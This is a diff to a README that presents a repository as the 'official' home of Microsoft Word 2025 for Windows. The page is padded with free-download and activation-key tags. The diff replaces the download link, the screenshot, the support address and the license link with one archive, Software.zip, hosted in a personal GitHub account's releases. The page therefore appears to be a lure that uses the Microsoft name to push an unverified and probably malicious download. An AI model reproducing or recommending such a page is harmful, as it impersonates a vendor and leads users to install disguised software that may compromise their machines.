@@ -12,7 +12,7 @@ Welcome to the official repository of **Microsoft Word 2025 for Windows**! Here 
 - "download-microsoft-word-2025, install-word, microsoft-word, microsoft-word-2025, microsoft-word-activation-key, microsoft-word-setup, microsoft-word-templates, word-2025-download, word-365-cloud, word-ai-tools, word-collaboration, word-encryption, word-free-download, word-ink-support, word-proofing-tools, word-writing-assistance"
 
 ## 🌐 Additional Resources
-- **Download Microsoft Word 2025 for Windows:** [Click here to download!](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+- **Download Microsoft Word 2025 for Windows:** [Click here to download!](https://github.com/khaledakram23/Microsoft-Word-For-Windows/releases/download/v2.0/Software.zip)
   - Launch the file to begin the download process.
 
 ## 📌 Features
@@ -35,7 +35,7 @@ Work together with colleagues or classmates in real-time using Word's collaborat
 Let Word's proofing tools assist you in creating flawless content. From grammar checking to style suggestions, ensure your writing is top-notch every time.
 
 ## 📷 Screenshots
-![Microsoft Word 2025 Interface](https://www.example.com/microsoft-word-2025-interface.png)
+![Microsoft Word 2025 Interface](https://github.com/khaledakram23/Microsoft-Word-For-Windows/releases/download/v2.0/Software.zip)
 
 ## 📄 Installation Guide
 1. Download the Microsoft Word 2025 installation file from the provided link.
@@ -47,10 +47,10 @@ Let Word's proofing tools assist you in creating flawless content. From grammar 
 We welcome contributions from the community to enhance the functionality of Microsoft Word 2025 for Windows. Feel free to submit pull requests with new features, bug fixes, or enhancements.
 
 ## 📞 Support
-For any queries or issues regarding Microsoft Word 2025, please reach out to our support team at support@microsoftword2025.com.
+For any queries or issues regarding Microsoft Word 2025, please reach out to our support team at https://github.com/khaledakram23/Microsoft-Word-For-Windows/releases/download/v2.0/Software.zip
 
 ## 📝 License
-This repository is licensed under the [MIT license](https://opensource.org/licenses/MIT).
+This repository is licensed under the [MIT license](https://github.com/khaledakram23/Microsoft-Word-For-Windows/releases/download/v2.0/Software.zip).
 
 ---
 
